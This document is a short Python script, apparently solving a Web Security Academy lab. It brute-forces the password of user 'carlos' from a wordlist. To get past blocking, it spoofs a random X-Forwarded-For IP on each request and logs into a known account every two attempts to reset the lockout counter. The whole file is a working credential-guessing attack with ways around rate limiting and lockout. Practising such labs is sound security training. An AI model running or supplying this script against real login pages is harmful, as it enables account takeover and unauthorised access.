import requests
import random

from tqdm import tqdm

def check_credentials(password, username='carlos'):
    url = 'https://0a9e00060472ca288160fdd300e80087.web-security-academy.net/login'
    data = {'username': username,'password': password}
    headers = {'X-Forwarded-For': f'127.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}
    with requests.session() as s:
        r = s.post(url=url, headers=headers, data=data)
        if 'Incorrect password' not in r.text:
            print(f"{username=} : {password=}")
            return


if __name__ == '__main__':
    with open('passwords.txt', 'r') as r:
        passwords = r.read().split('\n')

    counter = 0
    for password in tqdm(passwords):
        if counter == 2:
            check_credentials('peter', 'wiener')
            counter = 0
        check_credentials(password=password)
        counter+=1